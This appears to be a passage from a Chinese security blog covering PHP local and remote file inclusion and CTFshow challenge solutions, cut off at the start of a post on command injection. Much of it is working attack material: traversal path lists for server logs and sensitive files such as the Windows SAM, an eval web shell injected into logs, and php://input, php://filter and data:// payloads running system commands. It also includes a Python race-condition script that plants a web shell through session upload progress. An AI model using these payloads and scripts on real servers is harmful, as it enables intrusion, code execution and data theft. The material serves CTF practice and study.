+<h2 id="3-2-包含日志"><a href="#3-2-包含日志" class="headerlink" title="3.2 包含日志"></a>3.2 包含日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../var/log/apache/error.log</span><br><span class="line"></span><br><span class="line"># apache</span><br><span class="line">../apache/logs/error.log</span><br><span class="line">../apache/logs/access.log</span><br><span class="line">../../apache/logs/error.log</span><br><span class="line">../../apache/logs/access.log</span><br><span class="line">../../../apache/logs/error.log</span><br><span class="line">../../../apache/logs/access.log</span><br><span class="line">../../../../../../../etc/httpd/logs/acces_log</span><br><span class="line">../../../../../../../etc/httpd/logs/acces.log</span><br><span class="line">../../../../../../../etc/httpd/logs/error.log</span><br><span class="line">../../../../../../../etc/httpd/logs/error_log</span><br><span class="line">../../../../../../../var/www/logs/access_log</span><br><span class="line">../../../../../../../var/www/logs/access.log</span><br><span class="line">../../../../../../../usr/local/apache/logs/access_log</span><br><span class="line">../../../../../../../usr/local/apache/logs/access.log</span><br><span class="line">../../../../../../../var/log/apache/access_log</span><br><span class="line">../../../../../../../var/log/apache2/access_log</span><br><span class="line">../../../../../../../var/log/apache/access.log</span><br><span class="line">../../../../../../../var/log/apache2/access.log</span><br><span class="line">../../../../../../../var/log/access_log</span><br><span class="line">../../../../../../../var/log/access.log</span><br><span class="line">../../../../../../../var/www/logs/error_log</span><br><span class="line">../../../../../../../var/www/logs/error.log</span><br><span class="line">../../../../../../../usr/local/apache/logs/error_l og</span><br><span class="line">../../../../../../../usr/local/apache/logs/error.l og</span><br><span class="line">../../../../../../../var/log/apache/error_log</span><br><span class="line">../../../../../../../var/log/apache2/error_log</span><br><span class="line">../../../../../../../var/log/apache/error.log</span><br><span class="line">../../../../../../../var/log/apache2/error.log</span><br><span class="line">../../../../../../../var/log/error_log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line"></span><br><span class="line"># 读配置文件找日志路径</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line"></span><br><span class="line">#=============</span><br><span class="line"># windows</span><br><span class="line">#=============</span><br><span class="line"># window 2003+iis6.0 日志文件默认放在</span><br><span class="line">C:\WINDOWS\system32\Logfiles</span><br><span class="line">配置文件默认在</span><br><span class="line">C:\Windows\system32\inetsrv\metabase.xml</span><br><span class="line"></span><br><span class="line"># iis 7日志文件默认在</span><br><span class="line">C:\inetpub\logs\LogFiles</span><br><span class="line"># 配置文件默认目录</span><br><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br><span class="line"></span><br><span class="line">C:\apache\logs\access.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\access.log</span><br><span class="line">C:\program files\wamp\apache2\logs</span><br><span class="line">C:\wamp\logs</span><br><span class="line">C:\xampp\apache\logs\error.log</span><br><span class="line"></span><br><span class="line">C:\apache\logs\error.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\error.log</span><br><span class="line">C:\wamp\apache2\logs</span><br><span class="line">C:\xampp\apache\logs\access.log</span><br><span class="line"></span><br><span class="line"># 敏感文件</span><br><span class="line">Windows：</span><br><span class="line">  C:\boot.ini  //查看系统版本</span><br><span class="line">  C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件</span><br><span class="line">  C:\Windows\repair\sam  //存储系统初次安装的密码</span><br><span class="line">  C:\Program Files\mysql\my.ini  //Mysql配置</span><br><span class="line">  C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root</span><br><span class="line">  C:\Windows\php.ini  //php配置信息</span><br><span class="line">  C:\Windows\my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>
+<p>某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,我们必须把空格真正写入WEB日志。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**/eval($_POST[cmd]);/**/?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>short_open_tag=on</p>
+</li>
+<li><p>WEB服务器一个奇怪的特性<br>如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码. </p>
+</li>
+</ul>
+<p>这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。</p>
+<p>利用 NC 伪造没有Connection HTTP标头的请求包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /index&lt; &gt;.php HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)</span><br><span class="line">Host: 192.168.3.44</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-3-获取web目录或配置文件"><a href="#3-3-获取web目录或配置文件" class="headerlink" title="3.3 获取web目录或配置文件"></a>3.3 获取web目录或配置文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../usr/local/apache2/conf/httpd.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/httpd/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-4-包含上传附件"><a href="#3-4-包含上传附件" class="headerlink" title="3.4 包含上传附件"></a>3.4 包含上传附件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../attachment/media/xx.file</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-5-session文件"><a href="#3-5-session文件" class="headerlink" title="3.5 session文件"></a>3.5 session文件</h2><p>包含Session文件的条件也较为苛刻，它需要攻击者能够“控制”部分Session文件的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x|s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>PHP默认生成的Session文件往往存放在/tmp目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/sess_SESSIONID</span><br><span class="line"></span><br><span class="line">?file=../../../../../../../tmp/sess_xxxxx</span><br></pre></td></tr></table></figure>
+<p>session文件一般在/tmp目录下，格式未sess_[your phpsessid value],有时候也可能在/var/lib/php5之类的，在此之前建议先读取配置文件。</p>
+<h2 id="3-6-proc"><a href="#3-6-proc" class="headerlink" title="3.6 /proc"></a>3.6 /proc</h2><p>包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包含文件的路径，同时用户也能控制它的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-截断本地包含"><a href="#4-截断本地包含" class="headerlink" title="4.截断本地包含"></a>4.截断本地包含</h1><p>样例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($a.&quot;.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>影响函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">require</span><br><span class="line">file_get_contents</span><br><span class="line">file_exists</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-1-长文件名截断"><a href="#4-1-长文件名截断" class="headerlink" title="4.1 长文件名截断"></a>4.1 长文件名截断</h2><ul>
+<li>php版本为5.3.4以下</li>
+<li>GPC是否开启没关系  </li>
+</ul>
+<p>windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了</p>
+<p>样例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  include_once($_GET[&#x27;f&#x27;].&quot;.php&quot;); ?&gt;  </span><br><span class="line"></span><br><span class="line"># POC</span><br><span class="line">http://127.0.0.1/test/123.php?f=test.txt/././....../</span><br></pre></td></tr></table></figure>
+<ul>
+<li>wiwndows<br>在文件名后加<code>.\\</code>,<code>.</code>,<code>/</code>.<code>./</code>,<code>.\</code>都是可以的</li>
+<li>linux<br><code>/.</code>或<code>/</code></li>
+</ul>
+<h1 id="4-2-00截断包含"><a href="#4-2-00截断包含" class="headerlink" title="4.2 %00截断包含"></a>4.2 %00截断包含</h1><ul>
+<li>php版本小于5.3.4</li>
+<li>agic_quotes_gpc=OFF<br>当把magic_quotes_gpc打开，<code>%00</code>被转义成了<code>\0</code>，不再具有截断功能。所有的<code>&#39;</code>,<code>&quot;</code>,<code>\</code>和<code>NULL字符(%00)</code>都会被自动加上一个<code>反斜线</code>进行转义。还有很多函数有类似的作用，如：addslashes(),mysql_secape_string(),mysql_real_escape_string()等</li>
+</ul>
+<h1 id="5-远程包含"><a href="#5-远程包含" class="headerlink" title="5.远程包含"></a>5.远程包含</h1><p>条件：<code>allow_url_include=On</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>附加协议</th>
+<th>php</th>
+<th>样例(file=)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http(s)</td>
+<td>allow_url_fopen=On</td>
+<td></td>
+<td><a target="_blank" rel="noopener" href="http://ip/shell.txt">http://ip/shell.txt</a></td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>allow_url_fopen=On</td>
+<td></td>
+<td><a href="ftp://ip/shell.txt">ftp://ip/shell.txt</a></td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td></td>
+<td>&gt;=5.0</td>
+<td>php://filter/convert.base64-encode/resource=index.php</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td></td>
+<td></td>
+<td>php://input POST:<?php echo 111;?></td>
+</tr>
+<tr>
+<td>data://</td>
+<td></td>
+<td>&gt;=5.2</td>
+<td>data://text/plain;base64,MTE=</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>“zlib://“和”ogg://“等方式绕过 远程文件包含(RFI)</p>
+</blockquote>
+<h2 id="5-1-data"><a href="#5-1-data" class="headerlink" title="5.1 data://"></a>5.1 data://</h2><p>样例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># base64 decode is &#x27;I love PHP\n&#x27;</span><br><span class="line">echo file_get_contents(&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;);</span><br><span class="line"></span><br><span class="line">// URL + Base64 , 隐藏特殊字符 &#x27;/&#x27;</span><br><span class="line">index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==</span><br></pre></td></tr></table></figure>
+<p>影响函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once</span><br><span class="line">require</span><br><span class="line">require_once</span><br><span class="line">file_get_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-2-php-input"><a href="#5-2-php-input" class="headerlink" title="5.2 php://input"></a>5.2 php://input</h2><p>可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p>
+<p>样例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　@include($_GET[&quot;file&quot;]);</span><br><span class="line">?&gt;</span><br><span class="line">http://localhost/test/index.php?file=php://input</span><br><span class="line"></span><br><span class="line"># echo test</span><br><span class="line">post: &lt;?php echo 111;?&gt;</span><br><span class="line"></span><br><span class="line"># phpinfo</span><br><span class="line">post: &lt;?php pnpinfo();?&gt;</span><br><span class="line"></span><br><span class="line"># system</span><br><span class="line">post: &lt;?php system(&#x27;ipconfig&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>读文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&quot;solution.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了. 解决这个问题的方法就是使用base64_encode进行编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo base64_encode(file_get_contents(&quot;solution.php&quot;));?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5-3-php-filter"><a href="#5-3-php-filter" class="headerlink" title="5.3 php://filter"></a>5.3 php://filter</h2><p>主要是利用了resource和vonvert，可以读到php的代码<br>ctf赛事中url参数值出现很像文件名的情况下，很有可能是文件包含，可利用filter协议读源码，通常flag在flag.php info.php phpinfo.php这几个文件中，优先考虑</p>
+<blockquote>
+<p>php&gt;=5.0</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line"></span><br><span class="line"># http</span><br><span class="line">?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</span><br><span class="line"></span><br><span class="line"># resource 绕过</span><br><span class="line">$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</span><br></pre></td></tr></table></figure>
+<p>向磁盘写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://fileter/write</span><br></pre></td></tr></table></figure>
+<p>一个过滤器或多个过滤器以管道符|分隔</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot; 然后写入当前目录下的example.txt */</span><br><span class="line">file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>glob<blockquote>
+<p>php&gt;5.3.0</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator(&quot;glob://ext/apl/examples/*.php&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">　　// 并打印文件名和文件尺寸</span><br><span class="line">　　$it = new DirectoryIterator(&quot;glob://E:\\wamp\\www\\test\\*.php&quot;);</span><br><span class="line">　　foreach($it as $f)</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br><span class="line">　　&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5-4-php-fd"><a href="#5-4-php-fd" class="headerlink" title="5.4 php://fd"></a>5.4 php://fd</h2><blockquote>
+<p>php&gt;= 5.3.6</p>
+</blockquote>
+<h1 id="6-windows特性"><a href="#6-windows特性" class="headerlink" title="6.windows特性"></a>6.windows特性</h1><h2 id="6-1通配符-lt-lt"><a href="#6-1通配符-lt-lt" class="headerlink" title="6.1通配符&lt;&lt;"></a>6.1通配符&lt;&lt;</h2><p>存在文件包含时，php在windows下包含文件，能使用<code>&lt;&lt;</code>当通配符用，使用<code>&lt;&lt;</code>符号相当于使用 <code>*</code>号通配符。</p>
+<ul>
+<li>样例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没有base_dir限制的情况下，会读到c:\windows\win.ini文件<br>这个问题是由windows API FindFirstFile的一个特性</li>
+<li>受影响函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once</span><br><span class="line">require</span><br><span class="line">require_once</span><br><span class="line">fopen</span><br><span class="line">copy</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line">readfile</span><br><span class="line">mkdir</span><br><span class="line">move_uploaded_file</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="CTFshow刷题记录"><a href="#CTFshow刷题记录" class="headerlink" title="CTFshow刷题记录"></a>CTFshow刷题记录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>解码后即可得到文件内容</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= `tac f*`;?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>用data协议执行php语句</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # &lt;?php system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>data协议+base64加密</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls /var/www/html&#x27;);phpinfo();</span><br><span class="line"></span><br><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>利用UA在日志中写入一句话，然后进行日志包含，寻找phpinfo前面的信息即可找到。</p>
+</blockquote>
+<blockquote>
+<p>利用session.upload_progress进行文件包含，在Cookie里设置PHPSESSID=TGAO，PHP会在服务器上创建一个文件：<code>/tmp/sess_TGAO</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session，并产生一个键值，这个键值由ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件中。<br>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+</blockquote>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://df5b744a-c60e-4548-a206-b0289b9da729.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;+++++++done+++++++&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=2.php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>利用伪协议的过滤器，将内容rot13加密。  </p>
+</blockquote>
+<blockquote>
+<p>然后全部URL编码两次绕过检测</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-14 23:15:16 / 修改时间：23:15:59" itemprop="dateCreated datePublished" datetime="2023-01-14T23:15:16+08:00">2023-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br>命令注入产生的原因：  </p>
+<ol>
+<li>web网站没有对用户提交的参数进行有效的检测过滤。  </li>
+<li>操作系统允许一条语句执行多条命令（连接符和管道符）</li>
+</ol>
+<p>windows操作系统命令<br>|命令|功能|<br>|—-|—-|<br>|ping|检测网络连通性|<br>|ipconfig|查看当前ip地址|<br>|netstat|查看网络端口及连接情况|<br>|net uesr|查看、增加、删除当前系统用户|<br>|net localgroup|查看、增加、删除当前系统用户组|<br>|dir|列出当前目录下的文件和子目录信息|<br>|req|注册表及其相关操作|<br>|systeminfo|查看当前计算机的综合信息|<br>|tasklist|显示当前运行的进程信息（可查看PID）|</p>
+<p>linux操作系统命令<br>|命令|功能|<br>|—-|—-|<br>|ifconfig|查看当前ip、mac等信息|<br>|netstat|查看网络端口及连接情况|<br>|whoami|查看当前用户|<br>|cat|查看文件内容|<br>|ls|查看当前目录下的文件和子目录信息|<br>|useradd|添加用户|<br>|userdel|删除用户|<br>|passwd|修改用户密码|</p>
+<table>
+<thead>
+<tr>
+<th>命令格式</th>
+<th>含义</th>
